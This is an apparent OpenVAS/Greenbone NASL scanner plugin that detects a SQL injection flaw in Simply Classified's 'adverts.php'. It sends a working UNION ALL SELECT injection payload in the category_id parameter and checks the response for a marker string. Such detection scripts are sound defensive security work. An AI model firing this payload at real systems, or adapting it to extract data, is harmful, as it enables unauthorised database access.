if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100090" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-03-29 17:14:47 +0200 (Sun, 29 Mar 2009)" );
	script_bugtraq_id( 34271 );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_name( "Simply Classified 'adverts.php' SQL Injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this
  vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable
  respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "summary", value: "Simply Classified is prone to an SQL-injection vulnerability because
  it fails to sufficiently sanitize user-supplied data before using it in an SQL query." );
	script_tag( name: "impact", value: "Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the underlying database." );
	script_tag( name: "affected", value: "Simply Classified 0.2 is vulnerable, other versions may also be affected." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/34271" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in make_list( "/classified" ) {
	url = NASLString( dir, "/adverts.php?category_id=5%20UNION%20ALL%20SELECT%201,2,0x53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10" );
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(!buf){
		continue;
	}
	if(egrep( pattern: "SQL-Injection-Test", string: buf )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

